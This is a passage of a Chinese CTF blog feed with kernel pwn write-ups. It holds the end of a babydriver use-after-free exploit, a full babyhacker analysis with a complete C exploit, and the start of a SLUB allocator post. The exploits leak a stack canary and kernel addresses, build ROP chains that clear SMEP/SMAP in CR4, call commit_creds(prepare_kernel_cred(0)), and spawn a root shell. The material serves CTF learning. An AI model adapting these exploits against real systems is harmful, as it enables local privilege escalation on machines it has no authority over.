class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[!] Failed!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd_1, fd_2;</span><br><span class="line">    <span class="keyword">int</span> fd_ptmx;</span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_struct[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">size_t</span> *rop;</span><br><span class="line">    <span class="keyword">void</span> *fake_tty_operations[<span class="number">30</span>];</span><br><span class="line">    <span class="keyword">size_t</span> swapgs_addr, iret_addr, pop_rdi_addr, mov_cr4_rdi_addr, xchg_eax_esp;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// open the device twice</span></span><br><span class="line">    fd_1 = <span class="built_in">open</span>(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line">    fd_2 = <span class="built_in">open</span>(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// malloc a chunk with sizeof(struct tty_struct)</span></span><br><span class="line">    ioctl(fd_1, COM_MALLOC, <span class="number">0x2E0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free the chunk</span></span><br><span class="line">    <span class="built_in">close</span>(fd_1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// open device ptmx</span></span><br><span class="line">    fd_ptmx = <span class="built_in">open</span>(<span class="string">"/dev/ptmx"</span>, O_RDONLY | O_NOCTTY);</span><br><span class="line">    <span class="keyword">if</span>(fd_ptmx == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[!] Device ptmx open failed!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[+] Device ptmx open successfully!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// save status</span></span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// rop chain</span></span><br><span class="line">    pop_rdi_addr = <span class="number">0xffffffff810d238d</span>;  <span class="comment">// pop rdi; ret;</span></span><br><span class="line">    mov_cr4_rdi_addr = <span class="number">0xffffffff81004d80</span>; <span class="comment">// mov cr4, rdi; pop rbp; ret;</span></span><br><span class="line">    swapgs_addr = <span class="number">0xffffffff81063694</span>;  <span class="comment">// swapgs_pop_rbp_ret;</span></span><br><span class="line">    iret_addr = <span class="number">0xffffffff8181a797</span>; <span class="comment">// iretq;</span></span><br><span class="line">    xchg_eax_esp = <span class="number">0xffffffff81007808</span>; <span class="comment">// xchg eax, esp; ret;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// mmap rop memory</span></span><br><span class="line">    rop = mmap((<span class="keyword">void</span> *)<span class="number">0x81000000</span>, <span class="number">0x8000</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(rop == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[!] Mmap failed!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    rop[<span class="number">0x7808</span> / <span class="number">8</span> + i++] = pop_rdi_addr;  </span><br><span class="line">    rop[<span class="number">0x7808</span> / <span class="number">8</span> + i++] = <span class="number">0x6f0</span>;  <span class="comment">// cr4</span></span><br><span class="line">    rop[<span class="number">0x7808</span> / <span class="number">8</span> + i++] = mov_cr4_rdi_addr; </span><br><span class="line">    rop[<span class="number">0x7808</span> / <span class="number">8</span> + i++] = <span class="number">0</span>; <span class="comment">// rbp;</span></span><br><span class="line">    rop[<span class="number">0x7808</span> / <span class="number">8</span> + i++] = (<span class="keyword">size_t</span>)&amp;priviledge_escalation;</span><br><span class="line">    rop[<span class="number">0x7808</span> / <span class="number">8</span> + i++] = swapgs_addr;  </span><br><span class="line">    rop[<span class="number">0x7808</span> / <span class="number">8</span> + i++] = <span class="number">0</span>; <span class="comment">// rbp;</span></span><br><span class="line">    rop[<span class="number">0x7808</span> / <span class="number">8</span> + i++] = iret_addr;</span><br><span class="line">    rop[<span class="number">0x7808</span> / <span class="number">8</span> + i++] = (<span class="keyword">size_t</span>)&amp;getshell;</span><br><span class="line">    rop[<span class="number">0x7808</span> / <span class="number">8</span> + i++] = user_cs;</span><br><span class="line">    rop[<span class="number">0x7808</span> / <span class="number">8</span> + i++] = user_rflags;</span><br><span class="line">    rop[<span class="number">0x7808</span> / <span class="number">8</span> + i++] = user_sp;</span><br><span class="line">    rop[<span class="number">0x7808</span> / <span class="number">8</span> + i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fake tty_operations</span></span><br><span class="line">    fake_tty_operations[<span class="number">12</span>] = (<span class="keyword">void</span> *)xchg_eax_esp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// modify tty_struct-&gt;tty_operations</span></span><br><span class="line">    <span class="built_in">read</span>(fd_2, fake_tty_struct, <span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] The first qword of tty_struct: %lx\n"</span>, *fake_tty_struct);</span><br><span class="line">    fake_tty_struct[<span class="number">3</span>] = (<span class="keyword">size_t</span>)fake_tty_operations;</span><br><span class="line">    <span class="built_in">write</span>(fd_2, fake_tty_struct, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ioctl ptmx</span></span><br><span class="line">    ioctl(fd_ptmx, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="2020高校战疫分享赛-babyhacker"><a href="#2020高校战疫分享赛-babyhacker" class="headerlink" title="2020高校战疫分享赛 babyhacker"></a>2020高校战疫分享赛 babyhacker</h1><h2 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h2><p>保护机制：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">stty intr ^]</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">cd</span> `dirname <span class="variable">$0</span>`</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append 'console=ttyS0 loglevel=3 oops=panic panic=1 kaslr' \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd initramfs.cpio \</span><br><span class="line">    -smp cores=2,threads=4 \</span><br><span class="line">    -cpu qemu64,smep,smap 2&gt;/dev/null \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure><p>开了smep，smap，kaslr以及canary。<br>解包文件系统，提取babyhacker.ko，分析<code>ioctl</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">babyhacker_ioctl</span><span class="params">(file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  file *rdx1; <span class="comment">// rdx</span></span><br><span class="line">  __int16 v5; <span class="comment">// di</span></span><br><span class="line">  <span class="keyword">int</span> v4[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-150h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+140h] [rbp-10h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+148h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__(file, cmd, arg);</span><br><span class="line">  v9 = v3;</span><br><span class="line">  v5 = (__int16)rdx1;</span><br><span class="line">  v8 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">switch</span> ( cmd )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x30001</span>u:</span><br><span class="line">      babyhacker_ioctl_0(rdx1, *(__int64 *)&amp;cmd, (<span class="keyword">unsigned</span> __int64)rdx1);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x30002</span>u:</span><br><span class="line">      copy_to_user(rdx1, v4, buffersize);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x30000</span>u:</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">int</span>)rdx1 &gt;= <span class="number">11</span> )</span><br><span class="line">        v5 = <span class="number">10</span>;</span><br><span class="line">      buffersize = v5;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __<span class="function">fastcall <span class="title">babyhacker_ioctl_0</span><span class="params">(file *file, __int64 cmd, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">int</span> v4[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-150h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+140h] [rbp-10h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+148h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__(file, cmd, arg);</span><br><span class="line">  v7 = v3;</span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">return</span> copy_from_user(v4, file, buffersize);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出，很明显的功能<code>0x30000</code>中，<code>(int)rdx1 &gt;= 11</code>只是截取了<code>rdx1</code>的低4 bytes，并作为<code>int</code>类型进行解析，若为负数则可以直接绕过此check。<br>而后续的对<code>buffersize = v5</code>的赋值，<code>v5 = (__int16)rdx1;</code>，截取了<code>rdx1</code>的低2 bytes作为长度值，所以这里<code>v5</code>的范围为<code>0x0 ~ 0xFFFF</code>。<br>那么在调用<code>0x30001</code>功能的时候，<code>copy_from_user(v4, file, buffersize)</code>中<code>buffersize</code>最大为<code>0xFFFF</code>，而<code>v4</code>最大为<code>0x50</code>。<br>同样的，<code>0x30002</code>功能也能读到<code>v4</code>之后的栈上的内容。</p><h2 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>首先利用OOB，读出canary以及栈上存在的vmlinux代码段残留地址，计算出vmlinux_base。</li><li>从bzImage中提取出vmlinux，然后搜索gadgets。</li><li>同上题，构造rop，依次bypass smep和smap，然后提权，返回用户态起shell。</li></ol><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_CMD 0x30000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WRITE_CMD 0x30001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> READ_CMD 0x30002</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MASK 0x80000000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int64_t</span> prepare_kernel_cred_offset = <span class="number">0xffffffff8dc19218</span> - <span class="number">0xffffffff8daa1820</span>;</span><br><span class="line"><span class="keyword">int64_t</span> commit_creds_offset = <span class="number">0xffffffff8dc19218</span> - <span class="number">0xffffffff8daa1430</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> prepare_kernel_cred, commit_creds;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ssize_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">"mov user_cs, cs;"</span></span><br><span class="line">            <span class="string">"mov user_ss, ss;"</span></span><br><span class="line">            <span class="string">"mov user_sp, rsp;"</span></span><br><span class="line">            <span class="string">"pushf;"</span></span><br><span class="line">            <span class="string">"pop user_rflags;"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[!] status saved\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">privilege</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *(*pkc)(<span class="keyword">void</span> *) = prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">void</span> (*cc)(<span class="keyword">void</span> *) = commit_creds;</span><br><span class="line"></span><br><span class="line">    cc(pkc(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[+] root!\n"</span>);</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[!] failed\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">retq</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">"swapgs;"</span></span><br><span class="line">            <span class="string">"iretq;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_rsp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">"sub rsp, 0x178;"</span></span><br><span class="line">            <span class="string">"ret;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/babyhacker"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"open failed"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> *buf = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (buf == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"mmap failed"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ioctl(fd, SIZE_CMD, <span class="number">0x158</span> | MASK);</span><br><span class="line">    ioctl(fd, READ_CMD, buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> canary = *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x140</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> vmlinux_addr = *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x150</span>);</span><br><span class="line">    prepare_kernel_cred = vmlinux_addr - prepare_kernel_cred_offset;</span><br><span class="line">    commit_creds = vmlinux_addr - commit_creds_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] canary is: %lx\n"</span>, canary);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] prepare_kernel_cred address is: %lx\n"</span>, prepare_kernel_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] commit_creds address is: %lx\n"</span>, commit_creds);</span><br><span class="line"></span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> pop_rdi = vmlinux_addr - <span class="number">0x219218</span> + <span class="number">0x9054d</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> mov_cr4_rdi = vmlinux_addr - <span class="number">0x219218</span> + <span class="number">0x4d70</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> base = <span class="number">0x140</span> / <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[idx] = (<span class="keyword">uint64_t</span>)privilege;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[idx++] += <span class="number">4</span>;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[idx] = (<span class="keyword">uint64_t</span>)retq;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[idx++] += <span class="number">8</span>;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[idx++] = (<span class="keyword">uint64_t</span>)getshell;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[idx++] = user_cs;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[idx++] = user_rflags;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[idx++] = user_sp;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    idx = <span class="number">0</span>;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[base + idx++] = canary;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[base + idx++] = <span class="number">0</span>;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[base + idx++] = pop_rdi;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[base + idx++] = <span class="number">0x6e0</span>;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[base + idx++] = mov_cr4_rdi;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[base + idx++] = <span class="number">0</span>;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[base + idx] = (<span class="keyword">uint64_t</span>)sub_rsp;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[base + idx++] += <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    ioctl(fd, SIZE_CMD, (<span class="number">0x140</span> + idx * <span class="number">8</span>) | MASK);</span><br><span class="line">    ioctl(fd, WRITE_CMD, buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/bypass_smep-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/bypass_smep-zh/</a></li><li><a href="https://www.anquanke.com/post/id/201454" target="_blank" rel="noopener">https://www.anquanke.com/post/id/201454</a></li><li><a href="http://www.g3n3rous.fun/index.php/archives/7/" target="_blank" rel="noopener">http://www.g3n3rous.fun/index.php/archives/7/</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前面只找到qwb的题目，这次突然又看到安全客上“Kernel Pwn 学习之路（二）”有蛮多以往的ROP赛题，算是再补充一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Reproduction" scheme="https://n0nop.com/categories/Reproduction/"/>
    
    
      <category term="CTF" scheme="https://n0nop.com/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.com/tags/pwn/"/>
    
      <category term="kernel" scheme="https://n0nop.com/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn: UAF</title>
    <link href="https://n0nop.com/2020/05/12/kernel-pwn-UAF/"/>
    <id>https://n0nop.com/2020/05/12/kernel-pwn-UAF/</id>
    <published>2020-05-12T12:46:39.000Z</published>
    <updated>2020-05-12T15:16:31.566Z</updated>
    
    <content type="html"><![CDATA[<p>因为课程作业里接触到了uaf的kernel pwn，虽然比较基础，但是还是有那么点基础，理解起来不会很吃力。这次复现的是CISCN 2017的一个kernel pwn babydriver，比较简单的UAF，但是还是有一些细节知识值得学习。</p><a id="more"></a><h1 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h1><h2 id="slub分配器"><a href="#slub分配器" class="headerlink" title="slub分配器"></a>slub分配器</h2><p>先贴张图:<br><img src="/2020/05/12/kernel-pwn-UAF/slub.png" alt><br>简单地了解一下内核内存管理的一些简单的特点，至于更深入的代码细节可以参考”Kernel Pwn 学习之路”系列文章。</p><ol><li>与glibc中的<code>malloc</code>有点相同的是，<code>kmalloc</code>同样需要对齐到某些特定的大小，只不过这个范围更加特殊。通过<code>sudo cat /proc/slabinfo | grep &quot;^kmalloc&quot;</code>查看可以分配的object大小。 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">kmalloc-8192         479    500   8192    4    8 : tunables    0    0    0 : slabdata    125    125      0</span><br><span class="line">kmalloc-4096        1356   1384   4096    8    8 : tunables    0    0    0 : slabdata    173    173      0</span><br><span class="line">kmalloc-2048        2322   2368   2048   16    8 : tunables    0    0    0 : slabdata    148    148      0</span><br><span class="line">kmalloc-1024        6702   6720   1024   32    8 : tunables    0    0    0 : slabdata    210    210      0</span><br><span class="line">kmalloc-512        30090  30464    512   64    8 : tunables    0    0    0 : slabdata    476    476      0</span><br><span class="line">kmalloc-256       187245 187328    256   64    4 : tunables    0    0    0 : slabdata   2927   2927      0</span><br><span class="line">kmalloc-192         5858   6174    192   42    2 : tunables    0    0    0 : slabdata    147    147      0</span><br><span class="line">kmalloc-128         3304   3904    128   64    2 : tunables    0    0    0 : slabdata     61     61      0</span><br><span class="line">kmalloc-96        193746 193746     96   42    1 : tunables    0    0    0 : slabdata   4613   4613      0</span><br><span class="line">kmalloc-64         54702  85696     64   64    1 : tunables    0    0    0 : slabdata   1339   1339      0</span><br><span class="line">kmalloc-32         14245  15744     32  128    1 : tunables    0    0    0 : slabdata    123    123      0</span><br><span class="line">kmalloc-16         15616  15616     16  256    1 : tunables    0    0    0 : slabdata     61     61      0</span><br><span class="line">kmalloc-8          16384  16384      8  512    1 : tunables    0    0    0 : slabdata     32     32      0</span><br></pre></td></tr></table></figure> 因此当需要分配一块内存的时候，chunk的大小会向上对齐到满足需求的最小的那个object size。</li><li>一般来说，<code>kmalloc</code>分配出来的chunk在物理地址上都是连续的，（有时会出现第一个chunk不连续的情况）。也就是说slub分配器中维护的<code>freelist</code>，存放一个单向链表，这个链表将该slub中空闲的object串起来，通过设置object首8 bytes（x86为4 